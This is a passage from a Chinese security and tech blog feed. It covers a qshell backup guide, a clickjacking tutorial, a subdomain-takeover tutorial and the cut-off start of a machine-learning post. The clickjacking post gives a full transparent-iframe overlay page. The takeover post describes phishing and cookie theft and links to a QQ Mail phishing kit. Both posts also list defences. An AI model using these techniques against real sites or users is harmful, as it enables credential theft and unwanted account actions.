id="0x02-配置qdownload参数"><a href="#0x02-配置qdownload参数" class="headerlink" title="0x02 配置qdownload参数"></a>0x02 配置qdownload参数</h2><p>qdownload是qshell中用来将七牛云空间数据同步到本地的，它的官方文档： <a href="https://github.com/qiniu/qshell/blob/master/docs/qdownload.md">https://github.com/qiniu/qshell/blob/master/docs/qdownload.md</a></p><p><img src="https://github.com/echohun/blog_image/blob/master/qshell_download/qshell03.png?raw=true"></p><p>qdownload所用到的参数过多，我们使用test.conf文件来方便的配置这些参数：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;dest_dir&quot;</span> : <span class="hljs-string">&quot;E:\\aaa\\backup&quot;</span>,<br><span class="hljs-attr">&quot;bucket&quot;</span> : <span class="hljs-string">&quot;xxxx&quot;</span>,<br><span class="hljs-attr">&quot;cdn_domain&quot;</span> : <span class="hljs-string">&quot;http://xxxxxxxx.bkt.clouddn.com&quot;</span>,<br><span class="hljs-attr">&quot;access_key&quot;</span> : <span class="hljs-string">&quot;xxxxxxxxx&quot;</span>,<br><span class="hljs-attr">&quot;secret_key&quot;</span> : <span class="hljs-string">&quot;xxxxxxxxx&quot;</span>,<br><span class="hljs-attr">&quot;is_private&quot;</span> : <span class="hljs-literal">false</span>,<br><span class="hljs-attr">&quot;prefix&quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-attr">&quot;suffix&quot;</span> : <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>各参数具体意义如下：</p><table><thead><tr><th>参数名</th><th>描述</th><th>可选参数</th></tr></thead><tbody><tr><td>dest_dir</td><td>本地数据备份路径，为全路径</td><td>N</td></tr><tr><td>bucket</td><td>空间名称</td><td>N</td></tr><tr><td>prefix</td><td>只同步指定前缀的文件，默认为空</td><td>Y</td></tr><tr><td>suffix</td><td>只同步指定后缀的文件，默认为空</td><td>Y</td></tr><tr><td>cdn_domain</td><td>设置下载的CDN域名</td><td>N</td></tr></tbody></table><p>其中dest_dir设置的路径参考上例中的路径格式书写即可，accesskey和secretkey我们已经在绑定时设置好了，又由于我们是拷贝所有文件，所以prefix参数和suffix参数都是空。</p><p>官方文档中有提到：“该功能默认需要计费，如果希望享受10G的免费流量，请自行设置cdn_domain参数，如不设置，需支付源站流量费用，无法减免！！！”</p><p>我们之前只是作为图床用自然是没有充值的，这个时候我们只需配置下cdn_domain参数，使用免费的10g流量下载一下就可以了。</p><p>我们将cdn_domain这个参数设置成存储空间的那个免费域名就可以了。</p><h2 id="0x03-批量下载文件"><a href="#0x03-批量下载文件" class="headerlink" title="0x03 批量下载文件"></a>0x03 批量下载文件</h2><p>配置全部完成之后，我们在qshell路径打开cmd窗口，使用：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">qshell qdownload 10 <span class="hljs-keyword">test</span>.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>即可下载全部文件到配置文件中指定好的文件夹内。</p><p><img src="https://github.com/echohun/blog_image/blob/master/qshell_download/qshell04.png?raw=true"></p><p>qdownload后面的参数10，为我们使用的并发线程数，像我这样几百个文件的，其实配置不配置影响不大，但是如果文件较多，建议使用多线程并发下载提升速度。</p>]]></content>
    
    
    <categories>
      
      <category>搭建博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>点击劫持</title>
    <link href="/2018/09/14/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/"/>
    <url>/2018/09/14/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-点击劫持-clickjacking"><a href="#0x00-点击劫持-clickjacking" class="headerlink" title="0x00 点击劫持(clickjacking)"></a>0x00 点击劫持(clickjacking)</h2><p>点击劫持，clickjacking，也被称为UI-覆盖攻击。它是通过覆盖不可见的框架误导受害者点击。虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。这种攻击利用了HTML中iframe标签的透明属性。</p><h2 id="0x01-点击劫持基础步骤"><a href="#0x01-点击劫持基础步骤" class="headerlink" title="0x01 点击劫持基础步骤"></a>0x01 点击劫持基础步骤</h2><p>攻击者创建一个网页，并用iframe包含另一个目标网站。（如淘宝等）</p><p>调整iframe属性使目标网站透明。</p><p>根据想要诱导受害者点击目标网站上按键的位置，在自己创建的网站同样的位置上布置一个按钮。</p><p>对方在无法看到iframe界面的情况下点击按钮，实际上在目标网站上做了危险操作。（如购买，转账）</p><h2 id="0x02-点击劫持实现"><a href="#0x02-点击劫持实现" class="headerlink" title="0x02 点击劫持实现"></a>0x02 点击劫持实现</h2><p>点击劫持最常见的方法就是上面所做的基础步骤，我们可以自己写一个网站实现一下。</p><p>先贴代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">body</span>&#123;</span><br><span class="css">      <span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">  <span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">  <span class="hljs-attribute">padding</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">  <span class="hljs-attribute">position</span>: relative;</span><br>  &#125;<br><span class="css"><span class="hljs-selector-tag">iframe</span>&#123;</span><br><span class="css"><span class="hljs-attribute">z-index</span>:<span class="hljs-number">1</span>;</span><br><span class="css"><span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br><br><span class="css">-moz-<span class="hljs-attribute">opacity</span>:<span class="hljs-number">0</span>;</span><br><span class="css"><span class="hljs-attribute">opacity</span>:<span class="hljs-number">0</span>;</span><br><span class="css"><span class="hljs-attribute">filter</span>:<span class="hljs-built_in">alpha</span>(opacity=<span class="hljs-number">0</span>);</span><br>&#125;<br><span class="css"><span class="hljs-selector-class">.a</span> <span class="hljs-selector-tag">input</span>&#123;</span><br><span class="css"><span class="hljs-attribute">z-index</span>:<span class="hljs-number">0</span>;</span><br><span class="css"><span class="hljs-attribute">width</span>: <span class="hljs-number">500px</span>;</span><br><span class="css"><span class="hljs-attribute">height</span>: <span class="hljs-number">38px</span>;</span><br><span class="css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">9px</span>  <span class="hljs-number">7px</span>;</span><br><span class="css">    <span class="hljs-attribute">vertical-align</span>: top;</span><br>    /*outline: none;<br><span class="css"><span class="hljs-attribute">border</span>: none;</span><br><span class="css">    <span class="hljs-attribute">box-shadow</span>: none;*/</span><br>&#125;<br><span class="css"><span class="hljs-selector-class">.a</span> <span class="hljs-selector-tag">form</span>&#123;</span><br><span class="css"><span class="hljs-attribute">z-index</span>:<span class="hljs-number">0</span>;</span><br><span class="css"><span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"><span class="hljs-attribute">top</span>: <span class="hljs-number">182px</span>;</span><br><span class="css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><br><span class="css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">319px</span>;</span><br><span class="css"><span class="hljs-attribute">width</span>: <span class="hljs-number">638px</span>;</span><br>&#125;<br><span class="css"><span class="hljs-selector-tag">button</span>&#123;</span><br><span class="css"><span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">102px</span>;</span><br><span class="css">    <span class="hljs-attribute">height</span>: <span class="hljs-number">38px</span>;</span><br><span class="css">    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">38px</span>;</span><br><span class="css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;</span><br><span class="css">    <span class="hljs-attribute">border</span>: <span class="hljs-number">0</span>;</span><br><span class="css">    <span class="hljs-attribute">background</span>: none;</span><br><span class="css">    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#38f</span>;</span><br><span class="css">    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;</span><br><span class="css">    <span class="hljs-attribute">color</span>: white;</span><br><span class="css">    <span class="hljs-attribute">box-shadow</span>: none;</span><br><span class="css">    <span class="hljs-attribute">font-weight</span>: normal;</span><br><span class="css">    <span class="hljs-attribute">position</span>: absolute;</span><br><span class="css">    <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;a&quot;</span> ;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;xxxx.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;test&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Try<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframepage&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;iframepage&quot;</span>  <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span>;&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>iframe调用过来的界面是不想让用户看到但是想让用户操作到的界面。我这里直接调用了百度的主页演示，并不会造成危害。</p><p>所以在iframe的css设置中:</p><ul><li><p>需要将它放在最上层(z-index数值高于我们其他页面的z-index)</p></li><li><p>且要透明：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">-moz-<span class="hljs-attribute">opacity</span>:<span class="hljs-number">0</span>;<br><span class="hljs-attribute">opacity</span>:<span class="hljs-number">0</span>;<br><span class="hljs-attribute">filter</span>:<span class="hljs-built_in">alpha</span>(opacity=<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li></ul><p>给用户看的是我们写好的一个页面，我在这里只写了一个form，里面存在和百度输入框和“百度一下”按钮一样大小的两个元素。在实际情况中可以制作好一个完整的网页，诱导用户在关键性的地方输入或点击。</p><p>然后我们先将透明度opacity的几个值设为0.1，然后打开这个页面，可以看到，百度的输入框和搜索按钮和我们写好的输入框和搜索按钮是完全重合的，并且由于iframe页面在上面，点击到这个输入框时，输入的内容是进入百度输入框里面的。</p><p><img src="https://github.com/echohun/blog_image/blob/master/click_jacking/clickjacking01.png?raw=true"></p><p>如果设置opacity=0调成完全透明时效果如下</p><p><img src="https://github.com/echohun/blog_image/blob/master/click_jacking/clickjacking02.png?raw=true"></p><p>我们在这个输入框输入内容并点Try，实际上却是在隐藏的百度页面中输入内容并点搜索。这其实就构成了点击劫持。</p><p>可能看到这里你会想，实现这个功能有什么实际意义呢？</p><p>当然如果只是跳转一个百度页面会没有什么意义，我们可以举一个小例子，如果一个用户恰好处于百度贴吧登陆的状态，浏览器记录的它的cookie，我的iframe调用的是一个透明的贴吧管理界面，而由于浏览器cookie的存在，这个用户在这个界面是处于登陆状态的，那么我通过精心构造一个页面诱使它点击“删除帖子”这个按钮，这个用户就很有可能在访问我的网站的时候，因为随意点了几下鼠标，导致控制自己帖子被删除。</p><p>如果去调用一些危险操作的页面（转账，付款，重置密码，注销账号），在开通小额免密支付的情况下，也许会在完全不知情的情况带来很多损失。</p><h2 id="0x03-配合其他漏洞"><a href="#0x03-配合其他漏洞" class="headerlink" title="0x03 配合其他漏洞"></a>0x03 配合其他漏洞</h2><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>通常的csrf由于同源策略、token等的原因，都会被拦截下来，但是点击劫持本就是在iframe中调用原网页，服务器会认为是用户自己在正确的页面做出了这些操作，可以通过点击劫持，去控制用户做那些csrf做不了的操作。</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>反射性xss漏洞触发时会在页面url中存在恶意xss代码，目前谷歌浏览器等都会进行拦截或警告，但是如果利用点击劫持，控制用户做出点击触发js代码的操作，就不会触发浏览器的安全策略，将一个原本可能无关紧要的漏洞变的具备威胁。</p><h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><h3 id="X-FRAME-OPTIONS"><a href="#X-FRAME-OPTIONS" class="headerlink" title="X-FRAME-OPTIONS"></a>X-FRAME-OPTIONS</h3><p>X-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击。并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。</p><p>这个头可以配置：</p><ul><li>DENY  // 拒绝任何域加载</li><li>SAMEORIGIN / / 允许同源域下加载</li><li>ALLOW-FROM  // 可以定义允许frame加载的页面地址</li></ul><p>在php中可以这样配置：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">header</span>(<span class="hljs-string">&#x27;X-Frame-Options:Deny&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="FrameBusting"><a href="#FrameBusting" class="headerlink" title="FrameBusting"></a>FrameBusting</h3><p>Frame Busting 代码使用 JavaScript 脚本阻止恶意网站载入网页。如果检测到网页被非法网页通过iframe载入，就执行自动跳转功能。</p><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>在面对存在验证码的页面时，用户看不到这个透明页面，肯定是不会输入验证码的，在危险操作位置布置验证码认证，就可以防止点击劫持造成危害。</p><h3 id="NoScript"><a href="#NoScript" class="headerlink" title="NoScript"></a>NoScript</h3><p>上述几种都是服务器所提供的策略，但我们总不能祈祷着每个网站都能做到这些安全策略，我们用户要保护自己，可以使用firefox的NoScript插件ClearClick，这个组件可以检测出页面存在的点击劫持攻击。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子域名劫持</title>
    <link href="/2018/09/10/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81/"/>
    <url>/2018/09/10/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前几个月，关于子域名劫持的安全报告数量激增，去看了几篇报告，感觉这也是一个现在较为广泛存在的问题，就写出来共享一下。</p><h2 id="0x01-子域名与域名解析"><a href="#0x01-子域名与域名解析" class="headerlink" title="0x01 子域名与域名解析"></a>0x01 子域名与域名解析</h2><p>先来介绍一下子域名和域名解析的一些相关知识。</p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>我们通常在域名提供商购买的域名如 baidu.com，并不是只能解析一个服务器，我们可以在它的基础上增加很多的子域名，比如 test.baidu.com，smtp.baidu.com，image.baidu.com，talent.baidu.com 等等，它们可以分别解析到不同的服务器。</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>域名解析的记录类型很多：</p><ul><li><p>A记录：地址记录，用来指定域名的IPv4地址，如果需要将域名指向一个IP地址，就需要添加A记录。</p></li><li><p>CNAME： 如果需要将域名指向另一个域名，再由另一个域名提供ip地址，就需要添加CNAME记录。</p></li><li><p>TXT：在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。</p></li><li><p>NS：域名服务器记录，如果需要把子域名交给其他DNS服务商解析，就需要添加NS记录。</p></li><li><p>AAAA：用来指定主机名（或域名）对应的IPv6地址（例如：ff06:0:0:0:0:0:0:c3）记录。</p></li><li><p>MX：如果需要设置邮箱，让邮箱能收到邮件，就需要添加MX记录。</p></li><li><p>显性URL：从一个地址301重定向到另一个地址的时候，就需要添加显性URL记录（注：DNSPod目前只支持301重定向）。</p></li><li><p>隐性URL：类似于显性URL，区别在于隐性URL不会改变地址栏中的域名。</p></li><li><p>SRV：记录了哪台计算机提供了哪个服务。格式为：服务的名字、点、协议的类型</p></li></ul><p>我们最常用的是A记录与CNMAE记录，分别是将域名指向ipv4地址或另一个域名。</p><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>子域名劫持产生的原因一般都是网站开启了很多子域名，这些子域名其中又有很多cname解析来解析到其他的网站，然后在某一天，这些被指向的网站废弃了，然后又没有去删除解析记录。</p><p>这些被废弃的网站原本的域名被攻击者注册或通过其他手段获得，然后定向到攻击者的服务器并在上面部署钓鱼网站，或者劫持cookie的代码，当用户再次访问这些子域名就会解析向钓鱼网站，或者被盗取cookie而丢失账号。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>我们可以用实例来证明一下，假设现在我们有一个域名 uuzdaisuki.com ,其中有一个解析记录 test.uuzdaisuki.com 原本指向我们另外一个域名 <a href="http://www.sbwyfdsmjb.tk/">www.sbwyfdsmjb.tk</a> ，但是有一天，我们废弃了这个功能，将第二个域名注销了，却忘记删掉这条解析记录。</p><p><img src="https://github.com/echohun/blog_image/blob/master/subdomain_takeover/subdomain01.png?raw=true"></p><p>如果这个解析被攻击者发现了(通过扫描之后的报错界面)，然后攻击者抢注了这个已经被废弃的域名 sbwyfdsmjb.tk，这个时候攻击者就可以将域名解析向自己的服务器，我这里以github页面证明一下。</p><p><img src="https://github.com/echohun/blog_image/blob/master/subdomain_takeover/subdomain02.png?raw=true"></p><p>可以看到，test.uuzdaisuki.com解析到了最终由攻击者可控的github页面。</p><p><img src="https://github.com/echohun/blog_image/blob/master/subdomain_takeover/subdomain03.png?raw=true"></p><p>这个时候从包括第二个域名及其之后的东西全部都是我们可控了，这个时候可以用来做些什么，相信大家心里都有数了。</p><p>我来举两个常见的例子：</p><h3 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h3><p>我们在第二个域名中，使用A记录解析到一台自己的匿名服务器，然后在服务器上部署web服务，根据第一个域名所在公司的业务类型，写一个相似的前端登陆界面然后发送链接出去，就可以实施钓鱼，被攻击者一般看到这个域名的确是所登陆业务的域名，也就不会有疑心了，钓鱼成功率大大增加。</p><p>提供一个qq邮箱的完整前后端钓鱼代码: <a href="https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC/qq%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%89%8D%E7%AB%AF%2B%E5%90%8E%E7%AB%AF%E5%85%A8%E4%BB%A3%E7%A0%81/mailqq">https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC/qq%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%89%8D%E7%AB%AF%2B%E5%90%8E%E7%AB%AF%E5%85%A8%E4%BB%A3%E7%A0%81/mailqq</a></p><p>效果如下，可以达到以假乱真：</p><p><img src="https://github.com/echohun/blog_image/blob/master/subdomain_takeover/subdomain04.png?raw=true"></p><h3 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h3><p>我们目前可以控制的子域名和对方业务属于同一个顶级域名，那同源策略就限制不了我们了，只需要在这个子域构造一个恶意的页面，跳转对这个顶级域名下其他业务发起请求，很容易造成跨站请求伪造。</p><p>详细可以参考这个案例： <a href="https://hackerone.com/reports/172137">https://hackerone.com/reports/172137</a></p><h3 id="cookie盗取"><a href="#cookie盗取" class="headerlink" title="cookie盗取"></a>cookie盗取</h3><p>同样的，既然我们控制的子域和对方业务属于同一个顶级域名，那么cookie的作用域，我们也是共享的，只需要在这个子域名增加代码将cookie保存起来，之后就可以利用cookie登陆这些被攻击用户的账号，造成cookie劫持。</p><p>具体方法和xss进行cookie盗取一样。</p><h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><p>造成子域名劫持根本的原因是运维人员的粗心大意，没有及时关闭掉废弃的dns解析，只需要及时关闭，就可以避免这个问题。但是不幸的是这个问题现在广泛的存在于各个企业之中，每周都能看到非常多关于子域名劫持的安全报告。</p><p>其他案例：</p><p><a href="https://hackerone.com/reports/32825">https://hackerone.com/reports/32825</a></p><p><a href="https://hackerone.com/reports/38007">https://hackerone.com/reports/38007</a></p><p><a href="https://hackerone.com/reports/175070">https://hackerone.com/reports/175070</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(9)——集成学习</title>
    <link href="/2018/09/06/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-9-%E2%80%94%E2%80%94%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/"/>
    <url>/2018/09/06/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-9-%E2%80%94%E2%80%94%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在我们设计的机器学习算法性能达到瓶颈却不满足我们的需求时，我们想在单一的学习器上提升精度需要投入大量的资源，很容易得不偿失。这个时候更好的做法是使用一种优化的策略来提升精度，那就是集成学习。</p><h2 id="0x01-集成学习"><a href="#0x01-集成学习" class="headerlink" title="0x01 集成学习"></a>0x01 集成学习</h2><p>现实生活中，我们经常会通过投票的方式，以做出更加可靠的决策。集成学习就与此类似。集成学习就是通过构建多个学习器，并通过一定的学习策略将他们结合起来。</p><p>集成学习通过将多个学习器进行结合，一般可获得比单一学习器显著优越的泛化性能。</p><h2 id="0x02-分类"><a href="#0x02-分类" class="headerlink" title="0x02 分类"></a>0x02 分类</h2><h3 id="以个体学习器的类型分类"><a href="#以个体学习器的类型分类" class="headerlink" title="以个体学习器的类型分类"></a>以个体学习器的类型分类</h3><ul><li>在集成中只包含同种类型的个体学习器，被称为同质集成。如：“决策树集成”，“神经网络集成”。</li><li>在集成种包含不同种类型的个体学习器，被称为异质集成。如同时包含决策树和神经网络。</li></ul><h3 id="以个体学习器的生成方式分类"><a href="#以个体学习器的生成方式分类" class="headerlink" title="以个体学习器的生成方式分类"></a>以个体学习器的生成方式分类</h3><ul><li>个体学习器之间存在较强的依赖关系，则需要使用串行生成的序列化方法。如：“Boosting”</li><li>个体学习器不存在强依赖关系，则可使用同时生成的并行化方法。如：“Bagging”、“随机森林”。</li></ul><h2 id="0x03-Boosting"><a href="#0x03-Boosting" class="headerlink" title="0x03 Boosting"></a>0x03 Boosting</h2><p>Boosting是一种可将弱学习器提升为强学习器的算法，这种算法的工作机制是先从初始训练集训练出一个基学习器，再根据基学习器的表现对训练样本分布进行调整，使得先前基学习器做错的训练样本在后续获得更多关注，然后基于调整后的样本分布来训练下一个基学习器。如此反复，直至基学习器数目达到我们需要的值，最终将这些基学习器进行加权结合。</p><h2 id="0x04-Bagging"><a href="#0x04-Bagging" class="headerlink" title="0x04 Bagging"></a>0x04 Bagging</h2><p>Bagging是并行式集成学习算法最著名的代表，它基于自助采样法，给定包含m个样本的数据集，我们先随机取出一个样本放入采样器中，再把该样本放回数据集，这样下次该样本仍可能被选中，经过m次随机采样操作，我们得到含有m个样本的采样集，初始训练集中有的样本多次出现，有的样本从未出现。</p><p>按照这种方法抽样出T个含m个样本的样本集，然后基于每个样本集训练一个基学习器，再将这些基学习器进行结合，就是Bagging。</p><h2 id="0x05-随机森林"><a href="#0x05-随机森林" class="headerlink" title="0x05 随机森林"></a>0x05 随机森林</h2><p>随机森林是Bagging的一个扩展变体，随机森林在以决策树为基学习器构建Bagging的基础上，进一步在训练过程中引入随机属性选择。</p><p>传统决策树在选择划分属性时是在当前结点的属性集合(共d个)中选择一个最优属性，而随机森林对决策树的每个结点，先从该结点的属性集合中随机选择一个包含k个属性的子集，然后再从这k个属性中选择最优属性进行划分。</p><p>很显然，k控制了随机性：</p><ul><li>如果k和总属性量相同，那就是传统决策树，随机性最低；</li><li>如果k=1，则随机选择一个属性用于划分，随机性最高。</li></ul><p>所以一般情况下，推荐选用k=log2（d）。</p><h2 id="0x06-结合策略"><a href="#0x06-结合策略" class="headerlink" title="0x06 结合策略"></a>0x06 结合策略</h2><p>之前多次提到了“结合”一词，但是究竟怎么将多个学习器的结果结合起来，也有很多种不同的策略。</p><p>下面给出一些常见的策略</p><h3 id="平均法"><a href="#平均法" class="headerlink" title="平均法"></a>平均法</h3><p>对于回归任务的数值型输出，常见的策略是平均法</p><h4 id="简单平均法"><a href="#简单平均法" class="headerlink" title="简单平均法"></a>简单平均法</h4><p>简单平均法就是将所有的学习器结果做算数平均，将平均数做为最终结果。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml9_01.png?raw=true"></p><h4 id="加权平均法"><a href="#加权平均法" class="headerlink" title="加权平均法"></a>加权平均法</h4><p>加权平均法是给予每一个学习器不同的权重，加权平均法的权重一般从训练数据中学习得到。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml9_02.png?raw=true"></p><h3 id="投票法"><a href="#投票法" class="headerlink" title="投票法"></a>投票法</h3><p>对于分类任务的标记型输出，常见的策略是投票法</p><h4 id="绝对多数投票法（硬投票）"><a href="#绝对多数投票法（硬投票）" class="headerlink" title="绝对多数投票法（硬投票）"></a>绝对多数投票法（硬投票）</h4><p>绝对多数投票法即某标记的得票数过半，则预测为该标记，否则拒绝预测。</p><h4 id="相对多数投票法（硬投票）"><a href="#相对多数投票法（硬投票）" class="headerlink" title="相对多数投票法（硬投票）"></a>相对多数投票法（硬投票）</h4><p>相对多数投票法即预测为得票最多的标记，若同时有多个最高票，则从中随机选取一个。</p><h4 id="加权投票法（软投票）"><a href="#加权投票法（软投票）" class="headerlink" 